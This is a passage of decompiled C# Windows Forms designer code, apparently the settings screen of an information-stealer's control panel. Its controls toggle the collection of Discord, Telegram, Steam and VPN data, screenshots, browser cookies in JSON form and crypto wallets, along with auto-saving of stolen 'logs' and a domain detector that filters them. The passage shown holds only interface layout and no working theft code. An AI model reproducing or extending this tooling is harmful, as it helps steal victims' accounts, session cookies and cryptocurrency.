		((MetroSetButton)this.metroSetButton4).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.metroSetButton4).Size = new System.Drawing.Size(190, 23);
		((MetroSetButton)this.metroSetButton4).Style = (Style)0;
		((MetroSetButton)this.metroSetButton4).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetButton4).TabIndex = 137;
		((System.Windows.Forms.Control)this.metroSetButton4).Text = "Edit wallets settings";
		((MetroSetButton)this.metroSetButton4).ThemeAuthor = "Narwin";
		((MetroSetButton)this.metroSetButton4).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.metroSetButton4).Click += new System.EventHandler(metroSetButton4_Click);
		((System.Windows.Forms.Control)this.label45).AutoSize = true;
		((System.Windows.Forms.Control)this.label45).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label45).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label45).Location = new System.Drawing.Point(288, 19);
		((System.Windows.Forms.Control)this.label45).Name = "label45";
		((System.Windows.Forms.Control)this.label45).Size = new System.Drawing.Size(126, 30);
		((System.Windows.Forms.Control)this.label45).TabIndex = 136;
		((System.Windows.Forms.Control)this.label45).Text = "Get Discord:";
		((System.Windows.Forms.Label)this.label45).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.discordCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.discordCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.discordCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.discordCb).Checked = true;
		((MetroSetCheckBox)this.discordCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.discordCb).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.discordCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.discordCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.discordCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.discordCb).Location = new System.Drawing.Point(468, 29);
		((System.Windows.Forms.Control)this.discordCb).Name = "discordCb";
		((MetroSetCheckBox)this.discordCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.discordCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.discordCb).Style = (Style)1;
		((MetroSetCheckBox)this.discordCb).StyleManager = null;
		((System.Windows.Forms.Control)this.discordCb).TabIndex = 135;
		((MetroSetCheckBox)this.discordCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.discordCb).ThemeName = "MetroDark";
		((MetroSetButton)this.chooseAutosaveDirectory).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.chooseAutosaveDirectory).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.chooseAutosaveDirectory).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.chooseAutosaveDirectory).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.chooseAutosaveDirectory).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.chooseAutosaveDirectory).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.chooseAutosaveDirectory).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.chooseAutosaveDirectory).Location = new System.Drawing.Point(408, 326);
		((System.Windows.Forms.Control)this.chooseAutosaveDirectory).Name = "chooseAutosaveDirectory";
		((MetroSetButton)this.chooseAutosaveDirectory).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.chooseAutosaveDirectory).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.chooseAutosaveDirectory).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.chooseAutosaveDirectory).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.chooseAutosaveDirectory).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.chooseAutosaveDirectory).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.chooseAutosaveDirectory).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.chooseAutosaveDirectory).Style = (Style)0;
		((MetroSetButton)this.chooseAutosaveDirectory).StyleManager = null;
		((System.Windows.Forms.Control)this.chooseAutosaveDirectory).TabIndex = 134;
		((System.Windows.Forms.Control)this.chooseAutosaveDirectory).Text = "Choose";
		((MetroSetButton)this.chooseAutosaveDirectory).ThemeAuthor = "Narwin";
		((MetroSetButton)this.chooseAutosaveDirectory).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.chooseAutosaveDirectory).Click += new System.EventHandler(chooseAutosaveDirectory_Click);
		((AnimaTextBox)this.autosaveDirTb).Dark = false;
		((System.Windows.Forms.Control)this.autosaveDirTb).Location = new System.Drawing.Point(54, 326);
		((AnimaTextBox)this.autosaveDirTb).MaxLength = 32767;
		((AnimaTextBox)this.autosaveDirTb).MultiLine = false;
		((System.Windows.Forms.Control)this.autosaveDirTb).Name = "autosaveDirTb";
		((AnimaTextBox)this.autosaveDirTb).Numeric = false;
		((AnimaTextBox)this.autosaveDirTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.autosaveDirTb).Size = new System.Drawing.Size(347, 23);
		((System.Windows.Forms.Control)this.autosaveDirTb).TabIndex = 133;
		((AnimaTextBox)this.autosaveDirTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label40).AutoSize = true;
		((System.Windows.Forms.Control)this.label40).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label40).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label40).Location = new System.Drawing.Point(51, 308);
		((System.Windows.Forms.Control)this.label40).Name = "label40";
		((System.Windows.Forms.Control)this.label40).Size = new System.Drawing.Size(152, 15);
		((System.Windows.Forms.Control)this.label40).TabIndex = 132;
		((System.Windows.Forms.Control)this.label40).Text = "Directory to auto-save logs:";
		((System.Windows.Forms.Control)this.screenshotLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.screenshotLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.screenshotLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.screenshotLbl).Location = new System.Drawing.Point(288, 181);
		((System.Windows.Forms.Control)this.screenshotLbl).Name = "screenshotLbl";
		((System.Windows.Forms.Control)this.screenshotLbl).Size = new System.Drawing.Size(158, 30);
		((System.Windows.Forms.Control)this.screenshotLbl).TabIndex = 131;
		((System.Windows.Forms.Control)this.screenshotLbl).Text = "Get Screenshot:";
		((System.Windows.Forms.Label)this.screenshotLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.screenshotCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.screenshotCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.screenshotCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.screenshotCb).Checked = true;
		((MetroSetCheckBox)this.screenshotCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.screenshotCb).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.screenshotCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.screenshotCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.screenshotCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.screenshotCb).Location = new System.Drawing.Point(468, 191);
		((System.Windows.Forms.Control)this.screenshotCb).Name = "screenshotCb";
		((MetroSetCheckBox)this.screenshotCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.screenshotCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.screenshotCb).Style = (Style)1;
		((MetroSetCheckBox)this.screenshotCb).StyleManager = null;
		((System.Windows.Forms.Control)this.screenshotCb).TabIndex = 130;
		((MetroSetCheckBox)this.screenshotCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.screenshotCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.telegramLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.telegramLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.telegramLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.telegramLbl).Location = new System.Drawing.Point(288, 139);
		((System.Windows.Forms.Control)this.telegramLbl).Name = "telegramLbl";
		((System.Windows.Forms.Control)this.telegramLbl).Size = new System.Drawing.Size(142, 30);
		((System.Windows.Forms.Control)this.telegramLbl).TabIndex = 129;
		((System.Windows.Forms.Control)this.telegramLbl).Text = "Get Telegram:";
		((System.Windows.Forms.Label)this.telegramLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.telegramCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.telegramCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.telegramCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.telegramCb).Checked = true;
		((MetroSetCheckBox)this.telegramCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.telegramCb).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.telegramCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.telegramCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.telegramCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.telegramCb).Location = new System.Drawing.Point(468, 149);
		((System.Windows.Forms.Control)this.telegramCb).Name = "telegramCb";
		((MetroSetCheckBox)this.telegramCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.telegramCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.telegramCb).Style = (Style)1;
		((MetroSetCheckBox)this.telegramCb).StyleManager = null;
		((System.Windows.Forms.Control)this.telegramCb).TabIndex = 128;
		((MetroSetCheckBox)this.telegramCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.telegramCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.steamLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.steamLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.steamLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.steamLbl).Location = new System.Drawing.Point(288, 99);
		((System.Windows.Forms.Control)this.steamLbl).Name = "steamLbl";
		((System.Windows.Forms.Control)this.steamLbl).Size = new System.Drawing.Size(114, 30);
		((System.Windows.Forms.Control)this.steamLbl).TabIndex = 127;
		((System.Windows.Forms.Control)this.steamLbl).Text = "Get Steam:";
		((System.Windows.Forms.Label)this.steamLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.steamCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.steamCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.steamCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.steamCb).Checked = true;
		((MetroSetCheckBox)this.steamCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.steamCb).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.steamCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.steamCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.steamCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.steamCb).Location = new System.Drawing.Point(468, 109);
		((System.Windows.Forms.Control)this.steamCb).Name = "steamCb";
		((MetroSetCheckBox)this.steamCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.steamCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.steamCb).Style = (Style)1;
		((MetroSetCheckBox)this.steamCb).StyleManager = null;
		((System.Windows.Forms.Control)this.steamCb).TabIndex = 126;
		((MetroSetCheckBox)this.steamCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.steamCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.vpnLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.vpnLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.vpnLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.vpnLbl).Location = new System.Drawing.Point(49, 181);
		((System.Windows.Forms.Control)this.vpnLbl).Name = "vpnLbl";
		((System.Windows.Forms.Control)this.vpnLbl).Size = new System.Drawing.Size(97, 30);
		((System.Windows.Forms.Control)this.vpnLbl).TabIndex = 125;
		((System.Windows.Forms.Control)this.vpnLbl).Text = "Get VPN:";
		((System.Windows.Forms.Label)this.vpnLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.vpnCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.vpnCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.vpnCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.vpnCb).Checked = true;
		((MetroSetCheckBox)this.vpnCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.vpnCb).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.vpnCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.vpnCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.vpnCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.vpnCb).Location = new System.Drawing.Point(229, 191);
		((System.Windows.Forms.Control)this.vpnCb).Name = "vpnCb";
		((MetroSetCheckBox)this.vpnCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.vpnCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.vpnCb).Style = (Style)1;
		((MetroSetCheckBox)this.vpnCb).StyleManager = null;
		((System.Windows.Forms.Control)this.vpnCb).TabIndex = 124;
		((MetroSetCheckBox)this.vpnCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.vpnCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.e2).AutoSize = true;
		((System.Windows.Forms.Control)this.e2).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.e2).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.e2).Location = new System.Drawing.Point(288, 227);
		((System.Windows.Forms.Control)this.e2).Name = "jsonCookiesLbl";
		((System.Windows.Forms.Control)this.e2).Size = new System.Drawing.Size(147, 30);
		((System.Windows.Forms.Control)this.e2).TabIndex = 123;
		((System.Windows.Forms.Control)this.e2).Text = "JSON Cookies:";
		((System.Windows.Forms.Label)this.e2).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.e3).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.e3).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.e3).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.e3).Checked = true;
		((MetroSetCheckBox)this.e3).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.e3).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.e3).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.e3).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.e3).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.e3).Location = new System.Drawing.Point(468, 237);
		((System.Windows.Forms.Control)this.e3).Name = "jsonCookiesCb";
		((MetroSetCheckBox)this.e3).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.e3).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.e3).Style = (Style)1;
		((MetroSetCheckBox)this.e3).StyleManager = null;
		((System.Windows.Forms.Control)this.e3).TabIndex = 122;
		((MetroSetCheckBox)this.e3).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.e3).ThemeName = "MetroDark";
		((MetroSetButton)this.d4).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.d4).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.d4).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.d4).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.d4).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.d4).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.d4).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.d4).Location = new System.Drawing.Point(1057, 541);
		((System.Windows.Forms.Control)this.d4).Name = "domainDetectorImportBtn";
		((MetroSetButton)this.d4).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.d4).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.d4).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.d4).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.d4).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.d4).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.d4).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.d4).Style = (Style)0;
		((MetroSetButton)this.d4).StyleManager = null;
		((System.Windows.Forms.Control)this.d4).TabIndex = 115;
		((System.Windows.Forms.Control)this.d4).Text = "From File";
		((MetroSetButton)this.d4).ThemeAuthor = "Narwin";
		((MetroSetButton)this.d4).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.d4).Click += new System.EventHandler(d4_Click);
		((MetroSetButton)this.d5).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.d5).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.d5).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.d5).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.d5).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.d5).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.d5).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.d5).Location = new System.Drawing.Point(1057, 570);
		((System.Windows.Forms.Control)this.d5).Name = "addDomainPatternBtn";
		((MetroSetButton)this.d5).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.d5).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.d5).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.d5).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.d5).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.d5).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.d5).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.d5).Style = (Style)0;
		((MetroSetButton)this.d5).StyleManager = null;
		((System.Windows.Forms.Control)this.d5).TabIndex = 114;
		((System.Windows.Forms.Control)this.d5).Text = "Add";
		((MetroSetButton)this.d5).ThemeAuthor = "Narwin";
		((MetroSetButton)this.d5).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.d5).Click += new System.EventHandler(d5_Click);
		((AnimaTextBox)this.d6).Dark = false;
		((System.Windows.Forms.Control)this.d6).Location = new System.Drawing.Point(547, 570);
		((AnimaTextBox)this.d6).MaxLength = 32767;
		((AnimaTextBox)this.d6).MultiLine = false;
		((System.Windows.Forms.Control)this.d6).Name = "domainDetectorTb";
		((AnimaTextBox)this.d6).Numeric = false;
		((AnimaTextBox)this.d6).ReadOnly = false;
		((System.Windows.Forms.Control)this.d6).Size = new System.Drawing.Size(504, 23);
		((System.Windows.Forms.Control)this.d6).TabIndex = 113;
		((AnimaTextBox)this.d6).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.d7).AutoSize = true;
		((System.Windows.Forms.Control)this.d7).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.d7).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.d7).Location = new System.Drawing.Point(544, 550);
		((System.Windows.Forms.Control)this.d7).Name = "label5";
		((System.Windows.Forms.Control)this.d7).Size = new System.Drawing.Size(131, 15);
		((System.Windows.Forms.Control)this.d7).TabIndex = 112;
		((System.Windows.Forms.Control)this.d7).Text = "Enter a domain pattern:";
		((System.Windows.Forms.Control)this.domainDetectorLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ListBox)this.domainDetectorLb).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		((System.Windows.Forms.Control)this.domainDetectorLb).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.d8;
		((System.Windows.Forms.Control)this.domainDetectorLb).Cursor = System.Windows.Forms.Cursors.Default;
		((System.Windows.Forms.Control)this.domainDetectorLb).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.domainDetectorLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListBox)this.domainDetectorLb).HorizontalScrollbar = true;
		((System.Windows.Forms.ListBox)this.domainDetectorLb).ItemHeight = 18;
		((System.Windows.Forms.Control)this.domainDetectorLb).Location = new System.Drawing.Point(547, 354);
		((System.Windows.Forms.Control)this.domainDetectorLb).Name = "domainDetectorLb";
		((System.Windows.Forms.Control)this.domainDetectorLb).Size = new System.Drawing.Size(585, 182);
		((System.Windows.Forms.Control)this.domainDetectorLb).TabIndex = 111;
		((System.Windows.Forms.Control)this.da).AutoSize = true;
		((System.Windows.Forms.Control)this.da).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.da).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.da).Location = new System.Drawing.Point(675, 321);
		((System.Windows.Forms.Control)this.da).Name = "label6";
		((System.Windows.Forms.Control)this.da).Size = new System.Drawing.Size(255, 30);
		((System.Windows.Forms.Control)this.da).TabIndex = 110;
		((System.Windows.Forms.Control)this.da).Text = "Domain Detector settings:";
		((System.Windows.Forms.Label)this.da).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetButton)this.d3).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.d3).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.d3).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.d3).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.d3).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.d3).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.d3).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.d3).Location = new System.Drawing.Point(1057, 268);
		((System.Windows.Forms.Control)this.d3).Name = "pathsImportBtn";
		((MetroSetButton)this.d3).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.d3).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.d3).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.d3).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.d3).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.d3).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.d3).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.d3).Style = (Style)0;
		((MetroSetButton)this.d3).StyleManager = null;
		((System.Windows.Forms.Control)this.d3).TabIndex = 109;
		((System.Windows.Forms.Control)this.d3).Text = "From File";
		((MetroSetButton)this.d3).ThemeAuthor = "Narwin";
		((MetroSetButton)this.d3).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.d3).Click += new System.EventHandler(d3_Click);
		((System.Windows.Forms.Control)this.cf).AutoSize = true;
		((System.Windows.Forms.Control)this.cf).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.cf).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.cf).Location = new System.Drawing.Point(288, 59);
		((System.Windows.Forms.Control)this.cf).Name = "userAgentLbl";
		((System.Windows.Forms.Control)this.cf).Size = new System.Drawing.Size(170, 30);
		((System.Windows.Forms.Control)this.cf).TabIndex = 108;
		((System.Windows.Forms.Control)this.cf).Text = "Block empty logs";
		((System.Windows.Forms.Label)this.cf).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.d0).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.d0).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.d0).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.d0).Checked = false;
		((MetroSetCheckBox)this.d0).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.d0).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.d0).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.d0).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.d0).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.d0).Location = new System.Drawing.Point(468, 69);
		((System.Windows.Forms.Control)this.d0).Name = "blockEmptyLogsCb";
		((MetroSetCheckBox)this.d0).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.d0).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.d0).Style = (Style)1;
		((MetroSetCheckBox)this.d0).StyleManager = null;
		((System.Windows.Forms.Control)this.d0).TabIndex = 107;
		((MetroSetCheckBox)this.d0).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.d0).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.c8).AutoSize = true;
		((System.Windows.Forms.Control)this.c8).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.c8).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
